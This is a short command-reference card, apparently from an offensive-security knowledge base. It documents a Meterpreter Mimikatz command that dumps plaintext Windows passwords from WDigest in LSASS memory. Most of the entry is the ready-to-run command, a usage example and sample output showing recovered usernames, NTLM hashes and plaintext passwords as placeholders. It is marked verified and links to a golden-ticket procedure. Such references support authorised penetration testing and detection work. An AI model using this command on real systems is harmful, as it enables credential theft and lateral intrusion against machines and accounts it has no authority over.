---
type: command
executor: meterpreter
data: 'mimikatz_command -f sekurlsa::wdigest'
output: null
platforms:
  - Windows
tags:
  - mimikatz
  - plaintext-passwords
verified: true
validated: true
---

# mimikatz-sekurlsa-wdigest

## Command

```meterpreter
mimikatz_command -f sekurlsa::wdigest
```

## Description

Extracts plaintext passwords from the WDigest authentication provider in LSASS memory, effective if WDigest is enabled (pre-Windows 8.1 default).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -f sekurlsa::wdigest | Targets WDigest credentials in LSASS | Yes |

## Examples

### Basic Usage

```meterpreter
mimikatz_command -f sekurlsa::wdigest
```

## Expected Output

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : $_USERNAME
Domain            : $_DOMAIN
Logon Server      : $_DC
Logon Time        : 1/1/2023 12:00:00 AM
SID               : S-1-5-21-...-1001

    msv : 
      [00000003] Primary
       * Username : $_USERNAME
       * Domain   : $_DOMAIN
       * NTLM     : aad3b435b51404eeaad3b435b51404ee
       * SHA1     : ...
      wdigest : 
       * Username : $_USERNAME
       * Domain   : $_DOMAIN
       * Password : $_PLAINTEXT_PASSWORD

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
- [[techniques/Credential Dumping|T1003.001 - LSASS Memory]]
